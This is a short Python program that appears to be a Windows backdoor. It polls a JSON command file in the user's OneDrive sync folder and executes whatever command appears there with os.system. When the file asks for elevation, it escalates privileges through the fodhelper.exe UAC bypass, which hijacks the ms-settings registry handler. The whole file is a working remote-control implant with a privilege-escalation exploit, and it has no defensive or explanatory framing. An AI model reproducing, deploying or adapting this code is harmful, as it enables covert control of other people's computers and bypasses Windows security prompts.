import winreg
import os
import options
import time
import json


def run_command_with_uac_bypass(command):
    hkcu_key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    reg_key = winreg.CreateKeyEx(hkcu_key, "Software\\Classes\\ms-settings\\Shell\\Open")
    command_key = winreg.CreateKeyEx(reg_key, "command")
    winreg.SetValueEx(command_key, "DelegateExecute", 0, winreg.REG_SZ, "")
    winreg.SetValue(command_key, None, winreg.REG_SZ, command)
    os.system("fodhelper.exe")

def get_onedrive_sync_folder():
    hkcu_key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    onedrive_personal_reg_key = winreg.OpenKey(hkcu_key, "Software\\Microsoft\\OneDrive\\Accounts\\Personal")
    onedrive_sync_folder = winreg.QueryValueEx(onedrive_personal_reg_key, "UserFolder")[0]
    return onedrive_sync_folder

def main():
    file_name = os.path.join(get_onedrive_sync_folder(), options.CMD_FILE_NAME)
    if os.path.exists(file_name):
        original_time = os.path.getmtime(file_name)
    else:
        original_time = 0

    while(True):
        if os.path.exists(file_name) and os.path.getmtime(file_name) > original_time:
            with open(file_name, "r") as f:
                cmd_json = json.load(f)
            original_time = os.path.getmtime(file_name)
            command = cmd_json.get("command", None)
            if None == command:
                continue
            if cmd_json.get("uac", False): 
                run_command_with_uac_bypass(command)
            else:
                os.system(command)
        time.sleep(1)
        

if "__main__" == __name__:
    main()